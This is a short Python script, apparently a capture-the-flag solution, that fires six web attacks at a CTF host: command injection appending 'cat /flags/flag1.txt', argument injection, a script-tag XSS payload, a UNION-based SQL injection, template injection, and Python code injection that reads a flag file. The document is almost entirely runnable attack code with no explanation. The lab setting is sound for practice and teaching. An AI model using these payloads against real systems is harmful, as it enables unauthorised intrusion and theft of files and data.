import requests

base_url = 'http://web1.spokane-ctf.com:8002'

# Command Injection (/ping/)
def exploit_command_injection():
    domain = 'example.com; cat /flags/flag1.txt'  # Injected command to retrieve flag
    response = requests.get(f'{base_url}/ping/?domain={domain}')
    print(response.text)
    print("\n\n\n\n\n\n")

# Argument Injection (/head/)
def exploit_argument_injection():
    d = '1000'
    # First, we read the first 10 bytes from the file, and then concatenate the injected command to retrieve the flag
    response = requests.get(f'{base_url}/head/?d={d} /flags/flag2.txt')
    print(response.text)
    print("\n\n\n\n\n\n")

# XSS (Cross-Site Scripting) (/xss)
def exploit_xss():
    payload = '<script>alert("XSS attack");</script>'
    response = requests.post(f'{base_url}/xss', data={'input': payload})
    print(response.text)
    print("\n\n\n\n\n\n")

# SQL Injection (/search)
def exploit_sql_injection():
    search = "' UNION SELECT * FROM flag; --"
    response = requests.post(f'{base_url}/search', data={'search': search})
    print(response.text)
    print("\n\n\n\n\n\n")

# Template Injection (/name/)
def exploit_template_injection():
    payload = '{{ flag }}'
    response = requests.get(f'{base_url}/name/?name={payload}')
    print(response.text)
    print("\n\n\n\n\n\n")

# Code Injection (/building_data)
def exploit_code_injection():
    name = 'a'
    address = "'\ntry:\n    print(open('/flags/flag6.txt').read())\nexcept Exception as e:\n    print('Error:', str(e))\n'"  # Injected code to retrieve flag
    response = requests.get(f'{base_url}/building_data?name={name}&address={address}')
    print(response.text)
    print("\n\n\n\n\n\n")

if __name__ == "__main__":
    exploit_command_injection()
    exploit_argument_injection()
    exploit_xss()
    exploit_sql_injection()
    exploit_template_injection()
    exploit_code_injection()